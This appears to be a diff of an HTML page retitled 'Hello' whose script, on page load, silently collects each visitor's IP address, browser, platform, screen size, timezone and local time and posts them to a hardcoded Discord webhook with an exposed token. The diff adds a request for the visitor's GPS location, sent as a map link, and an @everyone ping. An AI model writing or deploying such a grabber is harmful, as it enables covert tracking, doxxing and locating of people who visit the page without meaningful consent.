@@ -2,15 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Visitor Logger</title>
+  <title>Hello</title>
 </head>
 <body>
-  <h1>Visitor Logger Active</h1>
+  <h1>You Have Been Logged</h1>
 
   <script>
   (async () => {
     const webhookURL = "https://discord.com/api/webhooks/1395279513491079350/suo8tCqbxAo_hAWAcH0kiCw0cqEXqG6FCkzCS5wwxuQL1R6csw3LFl2TwpwHlkUVzlNc";
 
+    // Base visitor info
     const data = {
       ip: 'unknown',
       userAgent: navigator.userAgent,
@@ -23,33 +24,66 @@
       deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
     };
 
+    // Get visitor IP
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const json = await res.json();
       data.ip = json.ip;
     } catch {}
 
-    const message = `
-**New Visitor Logged:**
-- IP: ${data.ip}
-- Device: ${data.deviceType}
-- Platform: ${data.platform}
-- Browser: ${data.userAgent}
-- Language: ${data.language}
-- Screen Size: ${data.screenSize}
-- URL: ${data.url}
-- Timezone: ${data.timezone}
-- Local Time: ${data.localTime}
+    // Function to send message to Discord
+    async function sendToDiscord(message, embeds = []) {
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message, embeds: embeds })
+        });
+      } catch (err) {
+        console.error('Failed to send Discord message', err);
+      }
+    }
+
+    // Prepare base message with ping and emojis
+    let message = `@everyone
+🚨 **New Visitor Logged:** 🚨
+- 🌐 IP: ${data.ip}
+- 📱 Device: ${data.deviceType}
+- 💻 Platform: ${data.platform}
+- 🌍 Browser: ${data.userAgent}
+- 🗣 Language: ${data.language}
+- 🖥 Screen Size: ${data.screenSize}
+- 🔗 URL: ${data.url}
+- ⏰ Timezone: ${data.timezone}
+- 🕒 Local Time: ${data.localTime}
 `;
 
-    try {
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      });
-    } catch (err) {
-      console.error('Failed to send Discord message', err);
+    // Try to get location (with permission)
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude.toFixed(5);
+          const lon = pos.coords.longitude.toFixed(5);
+          data.latitude = lat;
+          data.longitude = lon;
+
+          const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          message += `- 📍 Location: [View on Map](${locationLink})`;
+
+          // Send message with location
+          await sendToDiscord(message);
+        },
+        async (error) => {
+          // User denied or error
+          message += "\n- 📍 Location: Permission denied or unavailable";
+          await sendToDiscord(message);
+        },
+        { timeout: 10000 }
+      );
+    } else {
+      message += "\n- 📍 Location: Geolocation not supported";
+      await sendToDiscord(message);
     }
   })();
   </script>
